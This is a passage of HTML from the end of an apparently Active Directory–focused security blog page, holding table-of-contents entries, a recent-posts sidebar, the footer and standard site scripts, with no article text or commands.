class="toc-text">Constrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GenericAll"><span class="toc-text">GenericAll</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync"><span class="toc-text">DCSync</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rsources"><span class="toc-text">Rsources</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/31/Abusing-Unconstrained-Delegation/" title="Abusing Unconstrained Delegation"><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F0bf0667e-6ae0-45c4-8872-2e681305a82c%2Fcat.png/size/w=1420?exp=1738429277&amp;sig=iW2lUmAI6hJU676keBuppKNf5Of6etS-YmAniqIOIps" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Abusing Unconstrained Delegation"/></a><div class="content"><a class="title" href="/2025/01/31/Abusing-Unconstrained-Delegation/" title="Abusing Unconstrained Delegation">Abusing Unconstrained Delegation</a><time datetime="2025-01-31T17:58:46.000Z" title="Created 2025-01-31 17:58:46">2025-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/01/BloodyAD-Cheatsheet/" title="BloodyAD Cheatsheet"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Febc8dc6e-40a9-492f-839f-b175138faa93%2Fcat.png?table=block&amp;id=14fd3b99-8509-80fd-bbe8-daf204d95fcc&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BloodyAD Cheatsheet"/></a><div class="content"><a class="title" href="/2024/12/01/BloodyAD-Cheatsheet/" title="BloodyAD Cheatsheet">BloodyAD Cheatsheet</a><time datetime="2024-12-01T20:16:14.000Z" title="Created 2024-12-01 20:16:14">2024-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/24/Redelegate-Vulnlab/" title="Redelegate - Vulnlab"><img src="https://assets.vulnlab.com/redelegate_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redelegate - Vulnlab"/></a><div class="content"><a class="title" href="/2024/11/24/Redelegate-Vulnlab/" title="Redelegate - Vulnlab">Redelegate - Vulnlab</a><time datetime="2024-11-24T16:47:11.000Z" title="Created 2024-11-24 16:47:11">2024-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/19/AD-ACLs-Cheatsheet/" title="AD ACLs Cheatsheet"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Ff66ee8a6-26a3-4033-891f-0379a8820600%2Fcat.png?table=block&amp;id=143d3b99-8509-8000-b976-d5c681cab379&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AD ACLs Cheatsheet"/></a><div class="content"><a class="title" href="/2024/11/19/AD-ACLs-Cheatsheet/" title="AD ACLs Cheatsheet">AD ACLs Cheatsheet</a><time datetime="2024-11-19T18:47:00.000Z" title="Created 2024-11-19 18:47:00">2024-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/25/Retro2-Vulnlab/" title="Retro2 - Vulnlab"><img src="https://assets.vulnlab.com/retro2_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Retro2 - Vulnlab"/></a><div class="content"><a class="title" href="/2024/08/25/Retro2-Vulnlab/" title="Retro2 - Vulnlab">Retro2 - Vulnlab</a><time datetime="2024-08-25T18:53:34.000Z" title="Created 2024-08-25 18:53:34">2024-08-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/train_travel.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By serioton</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">ฅ^•ﻌ•^ฅ</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>